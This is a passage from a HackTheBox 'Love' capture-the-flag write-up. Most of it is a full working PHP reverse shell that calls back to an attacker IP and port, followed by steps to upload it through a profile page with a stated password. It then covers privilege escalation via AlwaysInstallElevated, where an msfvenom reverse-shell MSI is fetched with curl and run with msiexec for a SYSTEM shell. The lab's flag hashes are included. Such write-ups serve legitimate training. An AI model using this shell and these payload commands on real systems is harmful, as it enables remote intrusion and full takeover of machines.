class="string">&#x27;r&#x27;</span></span><br><span class="line">        ) ,</span><br><span class="line">        1 =&gt; array(</span><br><span class="line">            <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        ) ,</span><br><span class="line">        2 =&gt; array(</span><br><span class="line">            <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    private <span class="variable">$o</span> = array();</span><br><span class="line">    private <span class="variable">$b</span> = 1024;</span><br><span class="line">    private <span class="variable">$c</span> = 0;</span><br><span class="line">    private <span class="variable">$e</span> = <span class="literal">false</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$a</span>, <span class="variable">$p</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;p = <span class="variable">$p</span>;</span><br><span class="line">        <span class="keyword">if</span> (stripos(PHP_OS, <span class="string">&#x27;LINUX&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;os = <span class="string">&#x27;LINUX&#x27;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;sh = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (stripos(PHP_OS, <span class="string">&#x27;WIN32&#x27;</span>) !== <span class="literal">false</span> || stripos(PHP_OS, <span class="string">&#x27;WINNT&#x27;</span>) !== <span class="literal">false</span> || stripos(PHP_OS, <span class="string">&#x27;WINDOWS&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;os = <span class="string">&#x27;WINDOWS&#x27;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;sh = <span class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;o[<span class="string">&#x27;bypass_shell&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;e = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;SYS_ERROR: Underlying operating system is not supported, script will now exit...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">dem</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$e</span> = <span class="literal">false</span>;</span><br><span class="line">        @error_reporting(0);</span><br><span class="line">        @set_time_limit(0);</span><br><span class="line">        <span class="keyword">if</span> (!function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;DAEMONIZE: pcntl_fork() does not exists, moving on...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="variable">$p</span> = @pcntl_fork()) &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;DAEMONIZE: Cannot fork off the parent process, moving on...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$p</span> &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$e</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;DAEMONIZE: Child process forked off successfully, parent process will now exit...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (posix_setsid() &lt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;DAEMONIZE: Completed successfully!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="built_in">umask</span>(0);</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> d(<span class="variable">$d</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$d</span> = str_replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line">        <span class="variable">$d</span> = str_replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> r(<span class="variable">$s</span>, <span class="variable">$n</span>, <span class="variable">$b</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$d</span> = @fread(<span class="variable">$s</span>, <span class="variable">$b</span>)) === <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;e = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;STRM_ERROR: Cannot read from <span class="variable">$&#123;n&#125;</span>, script will now exit...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> w(<span class="variable">$s</span>, <span class="variable">$n</span>, <span class="variable">$d</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$by</span> = @fwrite(<span class="variable">$s</span>, <span class="variable">$d</span>)) === <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;e = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;STRM_ERROR: Cannot write to <span class="variable">$&#123;n&#125;</span>, script will now exit...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$by</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> rw(<span class="variable">$i</span>, <span class="variable">$o</span>, <span class="variable">$in</span>, <span class="variable">$on</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$d</span> = <span class="variable">$this</span>-&gt;r(<span class="variable">$i</span>, <span class="variable">$in</span>, <span class="variable">$this</span>-&gt;b)) &amp;&amp; <span class="variable">$this</span>-&gt;w(<span class="variable">$o</span>, <span class="variable">$on</span>, <span class="variable">$d</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;os === <span class="string">&#x27;WINDOWS&#x27;</span> &amp;&amp; <span class="variable">$on</span> === <span class="string">&#x27;STDIN&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;c += strlen(<span class="variable">$d</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$this</span>-&gt;d(<span class="variable">$d</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">function</span> brw(<span class="variable">$i</span>, <span class="variable">$o</span>, <span class="variable">$in</span>, <span class="variable">$on</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span> = fstat(<span class="variable">$i</span>) [<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;os === <span class="string">&#x27;WINDOWS&#x27;</span> &amp;&amp; <span class="variable">$in</span> === <span class="string">&#x27;STDOUT&#x27;</span> &amp;&amp; <span class="variable">$this</span>-&gt;c)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$this</span>-&gt;c &gt; 0 &amp;&amp; (<span class="variable">$by</span> = <span class="variable">$this</span>-&gt;c &gt;= <span class="variable">$this</span>-&gt;b ? <span class="variable">$this</span>-&gt;b : <span class="variable">$this</span>-&gt;c) &amp;&amp; <span class="variable">$this</span>-&gt;r(<span class="variable">$i</span>, <span class="variable">$in</span>, <span class="variable">$by</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;c -= <span class="variable">$by</span>;</span><br><span class="line">                <span class="variable">$s</span> -= <span class="variable">$by</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$s</span> &gt; 0 &amp;&amp; (<span class="variable">$by</span> = <span class="variable">$s</span> &gt;= <span class="variable">$this</span>-&gt;b ? <span class="variable">$this</span>-&gt;b : <span class="variable">$s</span>) &amp;&amp; (<span class="variable">$d</span> = <span class="variable">$this</span>-&gt;r(<span class="variable">$i</span>, <span class="variable">$in</span>, <span class="variable">$by</span>)) &amp;&amp; <span class="variable">$this</span>-&gt;w(<span class="variable">$o</span>, <span class="variable">$on</span>, <span class="variable">$d</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$s</span> -= <span class="variable">$by</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;d(<span class="variable">$d</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">rn</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$this</span>-&gt;e &amp;&amp; !<span class="variable">$this</span>-&gt;dem())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$soc</span> = @fsockopen(<span class="variable">$this</span>-&gt;a, <span class="variable">$this</span>-&gt;p, <span class="variable">$en</span>, <span class="variable">$es</span>, 30);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$soc</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;SOC_ERROR: &#123;<span class="variable">$en</span>&#125;: &#123;<span class="variable">$es</span>&#125;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stream_set_blocking(<span class="variable">$soc</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="variable">$proc</span> = @proc_open(<span class="variable">$this</span>-&gt;sh, <span class="variable">$this</span>-&gt;ds, <span class="variable">$pps</span>, <span class="string">&#x27;/&#x27;</span>, null, <span class="variable">$this</span>-&gt;o);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$proc</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;PROC_ERROR: Cannot start the shell\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    foreach (<span class="variable">$ps</span> as <span class="variable">$pp</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        stream_set_blocking(<span class="variable">$pp</span>, <span class="literal">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    @fwrite(<span class="variable">$soc</span>, <span class="string">&quot;SOCKET: Shell has connected! PID: &quot;</span> . proc_get_status(<span class="variable">$proc</span>) [<span class="string">&#x27;pid&#x27;</span>] . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (feof(<span class="variable">$soc</span>))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;SOC_ERROR: Shell connection has been terminated\n&quot;</span>;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (feof(<span class="variable">$pps</span>[1]) || !proc_get_status(<span class="variable">$proc</span>) [<span class="string">&#x27;running&#x27;</span>])</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;PROC_ERROR: Shell process has been terminated\n&quot;</span>;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$s</span> = array(</span><br><span class="line">                            <span class="string">&#x27;read&#x27;</span> =&gt; array(</span><br><span class="line">                                <span class="variable">$soc</span>,</span><br><span class="line">                                <span class="variable">$pps</span>[1],</span><br><span class="line">                                <span class="variable">$pps</span>[2]</span><br><span class="line">                            ) ,</span><br><span class="line">                            <span class="string">&#x27;write&#x27;</span> =&gt; null,</span><br><span class="line">                            <span class="string">&#x27;except&#x27;</span> =&gt; null</span><br><span class="line">                        );</span><br><span class="line">                        <span class="variable">$ncs</span> = @stream_select(<span class="variable">$s</span>[<span class="string">&#x27;read&#x27;</span>], <span class="variable">$s</span>[<span class="string">&#x27;write&#x27;</span>], <span class="variable">$s</span>[<span class="string">&#x27;except&#x27;</span>], null);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$ncs</span> === <span class="literal">false</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;STRM_ERROR: stream_select() failed\n&quot;</span>;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$ncs</span> &gt; 0)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;os === <span class="string">&#x27;LINUX&#x27;</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (in_array(<span class="variable">$soc</span>, <span class="variable">$s</span>[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;rw(<span class="variable">$soc</span>, <span class="variable">$pps</span>[0], <span class="string">&#x27;SOCKET&#x27;</span>, <span class="string">&#x27;STDIN&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (in_array(<span class="variable">$pps</span>[2], <span class="variable">$s</span>[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;rw(<span class="variable">$pps</span>[2], <span class="variable">$soc</span>, <span class="string">&#x27;STDERR&#x27;</span>, <span class="string">&#x27;SOCKET&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (in_array(<span class="variable">$pps</span>[1], <span class="variable">$s</span>[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;rw(<span class="variable">$pps</span>[1], <span class="variable">$soc</span>, <span class="string">&#x27;STDOUT&#x27;</span>, <span class="string">&#x27;SOCKET&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;os === <span class="string">&#x27;WINDOWS&#x27;</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (in_array(<span class="variable">$soc</span>, <span class="variable">$s</span>[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;rw(<span class="variable">$soc</span>, <span class="variable">$pps</span>[0], <span class="string">&#x27;SOCKET&#x27;</span>, <span class="string">&#x27;STDIN&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (fstat(<span class="variable">$pps</span>[2]) [<span class="string">&#x27;size&#x27;</span>])</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;brw(<span class="variable">$pps</span>[2], <span class="variable">$soc</span>, <span class="string">&#x27;STDERR&#x27;</span>, <span class="string">&#x27;SOCKET&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (fstat(<span class="variable">$pps</span>[1]) [<span class="string">&#x27;size&#x27;</span>])</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="variable">$this</span>-&gt;brw(<span class="variable">$pps</span>[1], <span class="variable">$soc</span>, <span class="string">&#x27;STDOUT&#x27;</span>, <span class="string">&#x27;SOCKET&#x27;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (!<span class="variable">$this</span>-&gt;e);</span><br><span class="line">                    foreach (<span class="variable">$pps</span> as <span class="variable">$pp</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        fclose(<span class="variable">$pp</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    proc_close(<span class="variable">$proc</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                fclose(<span class="variable">$soc</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sh</span> = new Sh(<span class="string">&#x27;10.10.14.5&#x27;</span>, 9001);</span><br><span class="line"><span class="variable">$sh</span>-&gt;rn();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="built_in">unset</span>(<span class="variable">$sh</span>); /*@gc_collect_cycles();*/ ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Change the ip and port and we good to go.</p>
+<p>Now click on profile and then update.</p>
+<p>Now browse the exploit.php and enter the current password &#x3D; @LoveIsInTheAir!!!! and then click on save.</p>
+<ul>
+<li>Important: Before click on save start your netcat listner on 9001 for catch the shell.</li>
+</ul>
+<p>Now let’s check netcat listner.</p>
+<p>We got the rev shell now let’s get the user.txt file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/love]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001                                                                                                                                 </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.239.</span><br><span class="line">Ncat: Connection from 10.10.10.239:54537.</span><br><span class="line">SOCKET: Shell has connected! PID: 276</span><br><span class="line">Microsoft Windows [Version 10.0.19042.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span></span><br><span class="line">love\phoebe</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">ls</span> Users</span><br><span class="line"><span class="string">&#x27;ls&#x27;</span> is not recognized as an internal or external <span class="built_in">command</span>,</span><br><span class="line">operable program or batch file.</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span> Users</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 56DE-BA30</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">04/13/2021  06:58 AM    &lt;DIR&gt;          .</span><br><span class="line">04/13/2021  06:58 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/12/2021  03:00 PM    &lt;DIR&gt;          Administrator</span><br><span class="line">04/21/2021  07:01 AM    &lt;DIR&gt;          Phoebe</span><br><span class="line">04/12/2021  02:10 PM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)   2,277,662,720 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> Users\</span><br><span class="line"></span><br><span class="line">C:\Users&gt;<span class="built_in">cd</span> Phoebe\Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Phoebe\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">bd506f17991891d6af1de3879e88b091</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1945.jpg"></li>
+</ul>
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>let’s run winPEAS.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1946.jpg"></li>
+</ul>
+<p>After running winPEAS we have the Privilege for AlwaysInstallElevated</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9lZDRtNHMuYmxvZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi93aW5kb3dzL2Fsd2F5cy1pbnN0YWxsLWVsZXZhdGVk">Always Install Elevated<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>After reading the article we known that how to privesc.</p>
+<p>First we create a rev shell with msfvenom.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/love]</span><br><span class="line">└─<span class="comment"># msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f msi -o reverse.msi</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of msi file: 159744 bytes</span><br><span class="line">Saved as: reverse.msi</span><br></pre></td></tr></table></figure>
+
+<p>Now transfer the rev shell into the machiene.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Phoebe\Desktop&gt;curl http://10.10.14.5/reverse.msi -o reverse.msi</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  156k  100  156k    0     0   156k      0  0:00:01  0:00:01 --:--:--  109k</span><br><span class="line"></span><br><span class="line">C:\Users\Phoebe\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 56DE-BA30</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Phoebe\Desktop</span><br><span class="line"></span><br><span class="line">05/03/2021  02:09 AM    &lt;DIR&gt;          .</span><br><span class="line">05/03/2021  02:09 AM    &lt;DIR&gt;          ..</span><br><span class="line">05/03/2021  02:09 AM           159,744 reverse.msi</span><br><span class="line">04/28/2021  06:18 AM                34 user.txt</span><br><span class="line">               2 File(s)        159,778 bytes</span><br><span class="line">               2 Dir(s)   2,277,412,864 bytes free</span><br></pre></td></tr></table></figure>
+
+<p>now start your netcat listner.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1337</span><br></pre></td></tr></table></figure>
+
+<p>now paste this both command and then enter and you got the shell as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Phoebe\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 56DE-BA30</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Phoebe\Desktop</span><br><span class="line"></span><br><span class="line">05/03/2021  02:09 AM    &lt;DIR&gt;          .</span><br><span class="line">05/03/2021  02:09 AM    &lt;DIR&gt;          ..</span><br><span class="line">05/03/2021  02:09 AM           159,744 reverse.msi</span><br><span class="line">04/28/2021  06:18 AM                34 user.txt</span><br><span class="line">               2 File(s)        159,778 bytes</span><br><span class="line">               2 Dir(s)   2,277,597,184 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Phoebe\Desktop&gt;msiexec /quiet /qn /i setup.msi</span><br><span class="line"></span><br><span class="line">C:\Users\Phoebe\Desktop&gt;This installation package could not be opened.  Verify that the package exists and that you can access it, or contact the application vendor to verify that this is a valid Windows Installer package.</span><br><span class="line"></span><br><span class="line">C:\Users\Phoebe\Desktop&gt;msiexec /quiet /qn /i reverse.msi</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s get the root.txt file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/love]</span><br><span class="line">└─<span class="comment"># nc -lvp 1337                                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1337</span><br><span class="line">Ncat: Listening on 0.0.0.0:1337</span><br><span class="line">Ncat: Connection from 10.10.10.239.</span><br><span class="line">Ncat: Connection from 10.10.10.239:54539.</span><br><span class="line">Microsoft Windows [Version 10.0.19042.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;<span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 56DE-BA30</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">04/13/2021  03:20 AM    &lt;DIR&gt;          .</span><br><span class="line">04/13/2021  03:20 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/28/2021  06:18 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   2,277,384,192 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">54b6e31b307e2bc394f4f7d27556e788</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1947.jpg"></li>
+</ul>
